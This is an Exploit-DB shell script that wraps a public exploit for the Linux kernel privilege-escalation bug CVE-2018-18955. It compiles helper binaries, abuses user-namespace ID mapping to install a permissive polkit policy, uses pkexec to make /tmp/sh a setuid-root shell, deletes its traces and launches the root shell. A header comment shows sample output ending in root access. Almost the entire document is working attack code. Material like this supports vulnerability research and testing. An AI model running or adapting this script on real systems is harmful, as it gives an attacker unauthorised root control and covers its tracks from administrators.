#!/bin/sh
#
# EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47167.zip
#
# wrapper for Jann Horn's exploit for CVE-2018-18955
# uses polkit technique
# ---
# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.polkit.sh
# [*] Compiling...
# [*] Creating /usr/share/polkit-1/actions/subuid.policy...
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [*] Launching pkexec...
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Dec 29 14:22 /tmp/sh
# [*] Cleaning up...
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)

rootshell="/tmp/sh"
policy="subuid.policy"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists /usr/bin/pkexec; then
  echo '[-] pkexec is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo 'Compiling subuid_shell.c failed'
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo 'Compiling gcc_subshell.c failed'
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo 'Compiling rootshell.c failed'
  exit 1
fi

echo "[*] Creating /usr/share/polkit-1/actions/${policy}..."

echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE policyconfig PUBLIC
  "-//freedesktop//DTD PolicyKit Policy Configuration 1.0//EN"
  "http://www.freedesktop.org/standards/PolicyKit/1/policyconfig.dtd">
<policyconfig>
  <action id="org.freedesktop.policykit.exec">
    <defaults>
      <allow_any>yes</allow_any>
      <allow_inactive>yes</allow_inactive>
      <allow_active>yes</allow_active>
    </defaults>
  </action>
</policyconfig>' > "${policy}"

echo "cp ${policy} /usr/share/polkit-1/actions/${policy}" | ./subuid_shell ./subshell

if ! test -r "/usr/share/polkit-1/actions/${policy}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo "[*] Launching pkexec..."

/usr/bin/pkexec --disable-internal-agent 2>/dev/null /bin/sh -c "/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}"

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo '[*] Cleaning up...'
/bin/rm subuid_shell
/bin/rm subshell
/bin/rm "${policy}"
echo "/bin/rm /usr/share/polkit-1/actions/${policy}" | $rootshell

echo "[*] Launching root shell: ${rootshell}"
$rootshell